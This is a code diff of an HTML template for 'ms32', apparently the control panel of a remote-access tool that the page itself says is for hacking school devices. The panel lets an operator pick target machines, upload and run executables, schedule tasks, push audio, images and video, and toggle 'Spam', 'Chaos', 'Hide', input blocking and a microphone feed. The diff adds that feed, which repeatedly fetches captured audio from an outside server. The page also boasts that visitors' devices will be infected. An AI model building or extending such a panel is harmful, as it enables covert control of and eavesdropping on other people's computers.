@@ -3,28 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="ms32 is a website designed to for hacking school devices. This website is made by some professional hackers👽.NOTE : If you open this website then your device will also be hacked so open at your own risk. Anyone other than admin opens this website then a virus will also be injected to your device. insta: https://www.instagram.com/_shakti.ladke_?igsh=eDBzZnpncDZ3a2Nr
-    kisi ka baap se nahi darte 👽">
   <title>ms32</title>
   <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/static/style.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
   <link rel="icon" href="/static/favicon.ico" type="image/x-icon">
+  <style></style>
 </head>
 
 <body>
   <div class="progress-bar-container" style="display:none;">
     <div class="progress-bar" id="progress-bar"></div>
   </div>
-  <h1 style="display:none;">ms32-sha2</h1>
+
+  <header>
+    <h1 style="display:none;">ms32-sha2</h1>
+  </header>
+
   <div style="display:none;">
-    About the website : 
-    ms32 is a website designed to for hacking school devices. This website is made by some professional hackers👽.NOTE : If you open this website then your device will also be hacked so open at your own risk. Anyone other than admin opens this website then a virus will also be injected to your device. insta: https://www.instagram.com/_shakti.ladke_?igsh=eDBzZnpncDZ3a2Nr
-    kisi ka baap se nahi darte 👽
+    About the website: ms32 is a website designed for hacking school devices. This website is made by some professional hackers 👽.
+    <br> NOTE: If you open this website, your device will also be hacked, so open at your own risk.
+    <br> insta: https://www.instagram.com/_shakti.ladke_?igsh=eDBzZnpncDZ3a2Nr
+    <br> kisi ka baap se nahi darte 👽
   </div>
-  <h2 class="site-heading">
-    <pre>Project ms32               </pre>
-  </h2>
+
+  <h2 class="site-heading"><pre>Project ms32</pre></h2>
+
   <div class="home" id="home">
     <div class="container">
       <form action="/edit" method="POST" id="message-form">
@@ -36,10 +40,8 @@
         <input type="url" class="text" name="url" placeholder="Enter URL" required>
         <button class="btn" type="submit">Open</button>
       </form>
-
-      
     </div>
-    
+
     <div class="overlay-box" id="overlay-box">
       <form action="/add-task" method="POST" id="task-form">
         <textarea class="text" name="task" placeholder="Enter task description..." required></textarea>
@@ -53,7 +55,7 @@
       <input type="file" id="file-input" class="file-input">
       <button class="update-btn" id="update-btn">Update</button>
     </div>
-    
+
     <div class="center-bottom-buttons">
       <label for="center-file-input" class="btn">Choose File</label>
       <input type="file" id="center-file-input" class="exe-input" style="display: none;">
@@ -61,6 +63,7 @@
     </div>
 
     <div class="status" id="status" style="color:{{color}};">{{state}}</div>
+
     <div class="dropdown-container">
       <label for="Dropdown" style="color:#238636">Select Target</label>
       <select id="Dropdown" class="dropdown">
@@ -73,9 +76,6 @@
       </select>
     </div>
 
-
-
-
     <div class="dropdown-container errcont">
       <form id="errform">
         <label for="Dropdown" style="color:#238636">Err no to deploy</label>
@@ -84,7 +84,14 @@
       </form>
     </div>
 
-
+    <div class="right-toggle-buttons">
+      <button id="hide-toggle" style="background-color:{{hc}}">Hide: {{hs}}</button>
+      <button id="spam-toggle" style="background-color:{{sc}}">Spam: {{ss}}</button>
+      <button id="flip-toggle" style="background-color:{{fc}}">Chaos: {{fs}}</button>
+      <button id="share-toggle" style="background-color:{{shc}}">Share: {{shs}}</button>
+      <button id="IN-toggle" style="background-color:{{ic}}">IN_Block: {{is1}}</button>
+      <button id="mic-toggle" style="background-color:{{mc}}">Mic: {{ms}}</button>
+    </div>
 
     <div class="left-sidebar">
       <div class="sidebar-header">Schedule Task</div>
@@ -103,47 +110,75 @@
         </div>
         {% endfor %}
       </div>
-
       <div class="bottom-fixed">
         <button class="btn schedule-btn" id="add">Schedule</button>
       </div>
     </div>
 
-    <div class="sidebar">
+    <div class="bottom-right-buttons">
+      <label for="image-upload" class="upload-image-btn">Upload Img/Vid</label>
+      <input type="file" id="image-upload" class="file-input">
+      <button class="open-btn" id="open-btn">Open</button>
+    </div>
+
+    <div class="sidebar hidden" id="audio-sidebar">
       <div class="sidebar-header">Audio Files</div>
       <div class="sidebar-content">
         <div class="audio-list">
           {% for file in files %}
           <div class="audio-item">
             <span>{{file}}</span>
-            <div>
-              <form action="/play" method="POST" style="display:inline">
-                <input type="hidden" name="text" value="{{ file }}">
-                <button class="play-btn"><i class="fas fa-play"></i></button>
-              </form>
-              
-            </div>
+            <form action="/play" method="POST" style="display:inline">
+              <input type="hidden" name="audio" value="{{ file }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
           </div>
           {% endfor %}
         </div>
       </div>
-
-      <div class="bottom-right-buttons">
-        <label for="image-upload" class="upload-image-btn">Upload Img/Vid</label>
-        <input type="file" id="image-upload" class="file-input">
-        <button class="open-btn" id="open-btn">Open</button>
-      </div>
     </div>
 
-    <div class="right-toggle-buttons">
-      <button id="hide-toggle" style="background-color:{{hc}}">Hide: {{hs}}</button>
-      <button id="spam-toggle" style="background-color:{{sc}}">Spam: {{ss}}</button>
-      <button id="flip-toggle" style="background-color:{{fc}}">Chaos: {{fs}}</button>
-      <button id="share-toggle" style="background-color:{{shc}}">Share: {{shs}}</button>
+    <div id="img-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Image Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for img in images %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <img src="/static/images/{{ img }}" alt="Image" style="width: 50px; height: 50px; object-fit: cover; border-radius: 5px;">
+            <span>{{ img }}</span>
+            <form action="/img" method="POST" style="display:inline">
+              <input type="hidden" name="img" value="{{ img }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <div id="vid-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Video Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for vid in videos %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <span>{{ vid }}</span>
+            <form action="/vid" method="POST" style="display:inline">
+              <input type="hidden" name="vid" value="{{ vid }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <audio id="mic"></audio>
+    <div class="right-switcher">
+      <button id="audio-btn"><i class="fa fa-music"></i></button>
+      <button id="img-btn"><i class="fas fa-image"></i></button>
+      <button id="vid-btn"><i class="fas fa-video"></i></button>
     </div>
   </div>
 <script>
-
 update();
 fetchButtonState();
 
@@ -156,10 +191,13 @@ const openbtn = document.getElementById("open-btn");
 const dropdown = document.getElementById("Dropdown");
 const runbtn = document.getElementById("run-btn");
 const exeInput = document.getElementById("center-file-input");
-
+const audioPlayer = document.getElementById("mic")
+let mic
+let interval
 let isadded = false;
 let cmd;
 let state;
+
 
 dropdown.addEventListener("change", () => {
   fetch("/change-user", {
@@ -172,6 +210,22 @@ dropdown.addEventListener("change", () => {
   fetchButtonState()
 });
 
+async function playAudio() {
+    fetch('https://server-20zy.onrender.com/audio', { method: "GET" })
+        .then(response => response.arrayBuffer())
+        .then(buffer => {
+            const audioContext = new AudioContext();
+            const source = audioContext.createBufferSource();
+            audioContext.decodeAudioData(buffer, (decodedData) => {
+                source.buffer = decodedData;
+                source.connect(audioContext.destination);
+                source.start();
+                console.log("Audio is successfully playing.");
+            });
+        });
+}
+
+
 async function fetchButtonState() {
   try {
     const response = await fetch('/static/state.json');
@@ -182,6 +236,15 @@ async function fetchButtonState() {
     initializeToggleButton('spam-toggle', 'Spam', data.spamToggleState.state || 'off');
     initializeToggleButton('flip-toggle', 'Chaos', data.flipToggleState.state || 'off');
     initializeToggleButton('share-toggle', 'Share', data.shareToggleState.state || 'off');
+    initializeToggleButton('IN-toggle', 'IN_Block', data.INToggleState.state || 'off');
+    initializeToggleButton('mic-toggle', 'Mic', data.micToggleState.state || 'off');
+    if(data.micToggleState.state === "on"){
+      mic = true
+    }
+    else{
+      mic = false
+      clearInterval(interval)
+    }
   } catch (error) {
     console.error('Error fetching button state:', error);
   }
@@ -189,12 +252,10 @@ async function fetchButtonState() {
 
 function initializeToggleButton(buttonId, defaultText, initialState) {
   const button = document.getElementById(buttonId);
-
   const newButton = button.cloneNode(true);
   button.replaceWith(newButton);
 
   const updatedButton = document.getElementById(buttonId);
-  
   updatedButton.dataset.state = initialState;
   updatedButton.style.backgroundColor = initialState === 'on' ? 'green' : 'red';
   updatedButton.textContent = `${defaultText}: ${initialState === 'on' ? 'On' : 'Off'}`;
@@ -211,6 +272,11 @@ function initializeToggleButton(buttonId, defaultText, initialState) {
       cmd = "fLiP";
     }else if (defaultText === "Share"){
       cmd = "sHaRe"
+    }else if (defaultText === "IN_Block"){
+      cmd = "bLoCk"
+    }else if (defaultText === "Mic"){
+      cmd = "mIc"
+      interval = setInterval(playAudio,260)
     }
 
     if (updatedButton.dataset.state === 'on') {
@@ -431,6 +497,54 @@ document.querySelector("#errform").addEventListener("submit",(e)=>{
 setInterval(update, 1000);
 
 </script>
-</body>
+  <script>
+    const audioBtn = document.getElementById("audio-btn");
+    const imgBtn = document.getElementById("img-btn");
+    const vidBtn = document.getElementById("vid-btn");
+    const audioSidebar = document.getElementById("audio-sidebar");
+    const imgSidebar = document.getElementById("img-sidebar");
+    const vidSidebar = document.getElementById("vid-sidebar");
 
+    function hideAllSidebars() {
+      audioSidebar.classList.add("hidden");
+      imgSidebar.classList.add("hidden");
+      vidSidebar.classList.add("hidden");
+      audioBtn.classList.remove("active");
+      imgBtn.classList.remove("active");
+      vidBtn.classList.remove("active");
+    }
+
+    audioBtn.addEventListener("click", () => {
+      if (audioSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        audioSidebar.classList.remove("hidden");
+        audioBtn.classList.add("active");
+      } else {
+        audioSidebar.classList.add("hidden");
+        audioBtn.classList.remove("active");
+      }
+    });
+
+    imgBtn.addEventListener("click", () => {
+      if (imgSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        imgSidebar.classList.remove("hidden");
+        imgBtn.classList.add("active");
+      } else {
+        imgSidebar.classList.add("hidden");
+        imgBtn.classList.remove("active");
+      }
+    });
+    vidBtn.addEventListener("click", () => {
+      if (vidSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        vidSidebar.classList.remove("hidden");
+        vidBtn.classList.add("active");
+      } else {
+        vidSidebar.classList.add("hidden");
+        vidBtn.classList.remove("active");
+      }
+    });
+  </script>
+</body>
 </html>
